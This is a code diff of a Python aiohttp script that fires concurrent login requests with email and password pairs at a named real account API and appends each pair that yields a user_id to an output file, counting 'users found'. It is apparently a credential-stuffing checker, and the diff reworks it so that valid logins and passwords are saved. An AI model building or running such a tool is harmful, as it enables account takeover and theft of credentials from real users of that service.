@@ -7,10 +7,10 @@ import asyncio
 import aiohttp
 import time
 
-async def request(session, url, data):
+async def send_request(session, url, data):
     async with session.post(url=url, data=data) as response:
-        result = await response.text()
-        return result
+        result = await response.json()
+        return (result, data)
 
 async def test():
     start_time = time.time()
@@ -34,16 +34,21 @@ async def test():
             }
             #print(data)
             url = 'https://accountapi.bitsplus.cn/user/login'
-            tasks.append(asyncio.ensure_future(request(session, url, data)))
+            tasks.append(asyncio.ensure_future(send_request(session, url, data)))
 
-        responses = await asyncio.gather(*tasks)
+        results = await asyncio.gather(*tasks)
 
-        for response in responses:
-            if 'user_id' in response:
-                print(response)
-                user_id = response.json()['data']['user_id']
+        users_found: int = 0
+        for result in results:
+            response = result[0]
+            request = result[1]
+            if 'user_id' in str(response):
+                users_found += 1
+                user_id = response['data']['user_id']
+                login = request['mail']
+                password = request['passwd']
                 with open("output.txt", "a") as output_file:
-                    output_file.write(f'user_id:{user_id}:{line}')
-                    # output_file.write(f'{login} {password}')
+                    output_file.write(f'{user_id} {login} {password}\n')
 
     print("\n--- %s seconds ---" % (time.time() - start_time))
+    print(f'users found: {users_found}')
